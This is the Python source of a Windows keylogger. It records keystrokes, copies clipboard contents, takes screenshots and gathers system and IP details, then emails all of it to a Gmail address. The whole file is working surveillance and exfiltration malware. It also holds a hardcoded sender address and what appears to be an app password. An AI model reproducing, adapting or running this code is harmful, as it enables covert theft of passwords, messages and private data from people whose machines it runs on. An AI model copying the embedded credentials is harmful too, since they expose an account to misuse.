# installed pynput , pywin32, cryptography,scipy,pillow

import socket
import platform

import smtplib
from email.message import EmailMessage

import win32clipboard

from pynput.keyboard import Key, Listener
import time

from scipy.io.wavfile import write
import sounddevice as sd

from requests import get

from PIL import ImageGrab

keys_info = "key_info.txt"
sys_info = "sys_info.txt"
clipboard_info = "clip_info.txt"
ss_info = "screenshot.png"

time_iteration = 25
total_iterations = 1

file_path = "C:\\Users\\iambu\\Desktop\\AdvKeylogger"
extend = "\\"


# want to get info in mail
def sendmail(a):
    email = "hellicopter3435@gmail.com"
    pwd = "xdjzbspvpgolnaet"

    msg = EmailMessage()
    msg['Subject'] = 'KeyLogger Stated...'
    msg['From'] = email
    msg['To'] = 'iambuggah@gmail.com'

    msg.set_content('This is a plain text email')

    with open(a, 'rb') as file:
        file_data = file.read()
        file_name = file.name
    try:
        if a == "screenshot.png":
            msg.add_attachment(file_data, maintype='image', subtype='png', filename=file_name)
        else:
            msg.add_attachment(file_data, maintype='text', subtype='plain', filename=file_name)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(email, pwd)
            smtp.send_message(msg)
    except Exception:
        print("The email was not sent.")


def computer_info():
    with open(file_path + extend + sys_info, "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public ip Address: " + public_ip + '\n')
        except Exception:
            f.write("Max query , coudn't get ip ")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write(" Private IP : " + ipaddr + '\n')


computer_info()
# gives info about previously copied data


def clip_info():
    with open(file_path + extend + clipboard_info, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("The copied data is: " + pasted_data + '\n')
        except:
            f.write("The data coudn't be copied")


clip_info()


def ss():
    info = ImageGrab.grab()
    info.save(file_path + extend + ss_info)


no_of_iterations = 0
current_time = time.time()
stop_time = time.time() + time_iteration

while no_of_iterations < total_iterations:

    count = 0
    keys = []


    def on_press(key):
        global keys, count, current_time
        print('{0} -> key pressed'.format(key))
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(ke):
        with open(file_path + extend + keys_info, 'a') as f:
            for key in ke:
                k = str(key).replace("'", "")
                if k.find("Key") == -1:
                    f.write(k)
                elif k.find("space") > 0:
                    f.write(' ')


    def on_release(key):
        if key == Key.esc:
            exit()
        if current_time > stop_time:
            exit()


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    if current_time > stop_time:
        with open(file_path + extend + keys_info, 'a') as f:
            f.write("\niteration :" + str(no_of_iterations + 1) + "\n")
        sendmail(keys_info)
        ss()
        sendmail(ss_info)
        sendmail(sys_info)
        sendmail(clipboard_info)
        current_time = time.time()
        stop_time = time.time() + time_iteration
        no_of_iterations += 1
